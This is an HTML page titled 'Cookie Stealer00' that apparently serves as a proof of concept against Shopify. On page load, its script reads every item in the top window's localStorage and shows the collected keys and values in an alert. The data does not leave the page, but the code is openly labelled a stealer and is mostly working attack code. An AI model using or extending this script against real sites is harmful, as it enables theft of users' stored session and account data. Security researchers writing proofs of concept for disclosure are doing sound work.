<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Stealer00</title>
</head>
<body>
    <script>
        // Function to retrieve and display localStorage from cdn.shopify.com
        function displayShopifyLocalStorage() {
            try {
                const topWindow = window.top;
                const shopifyLocalStorage = topWindow.localStorage;

                // Retrieve all items from localStorage
                const shopifyLocalStorageItems = {};
                for (let i = 0; i < shopifyLocalStorage.length; i++) {
                    const key = shopifyLocalStorage.key(i);
                    const value = shopifyLocalStorage.getItem(key);
                    shopifyLocalStorageItems[key] = value;
                }

                alert('Shopify localStorage: ' + JSON.stringify(shopifyLocalStorageItems));
            } catch (e) {
                console.error('Error accessing localStorage:', e);
                alert('Error accessing localStorage: ' + e.message);
            }
        }

        // Call the function to display Shopify localStorage
        displayShopifyLocalStorage();
    </script>
</body>
</html>
